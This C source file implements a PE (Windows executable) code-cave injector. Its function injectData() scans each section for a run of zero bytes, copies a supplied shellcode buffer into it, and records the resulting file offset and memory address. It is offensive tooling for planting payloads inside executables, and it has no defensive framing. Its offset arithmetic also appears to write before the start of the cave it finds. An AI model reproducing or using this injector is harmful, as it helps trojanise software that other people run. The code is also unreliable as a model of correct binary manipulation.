#include "../lib/inject.h"


// Opaque types , Only this module needs to see them.

#define INJECT_STATE_NONE 0
#define INJECT_STATE_PARSING 1

short injectData(struct _PE_STRUCTURE *pe , struct _IMAGE_SECTION_HEADER **sections , compound_file *shellcode , struct inject_d *id){
	unsigned int nSections = pe->image_nt_header->image_file_header.numberOfSections;
	size_t space;
	// short state = INJECT_STATE_NONE;

	for(size_t i = 0 ; i < nSections ; i++){
		void *data = pe->buffer;
		data += sections[i]->virtualAddress;
		short state = INJECT_STATE_NONE;
		space = 0;
		for(size_t j = 0 ; j < sections[i]->sizeOfRawData ; j++ ){ //pe->buffer + sections[n]->virtualAddress = position in buffer of the n'th pe section
			if(*(char *)(data+j) == 0){
				space++;
				if(space == shellcode->size + 2){
					memcpy(data + j - (space + 2), shellcode->buffer, shellcode->size);
						id->offset_in_file = pe_map_to_file_offset(pe, data + j - space - 2);
						id->position_in_memory = pe_map_buffer_to_memoryEx(pe, data + j - space - 2);

					return 1;
				}
				state = INJECT_STATE_PARSING;
			}
			else{
				space = 0;
				state = INJECT_STATE_NONE;
			}
		}
	}

	return 0;
}
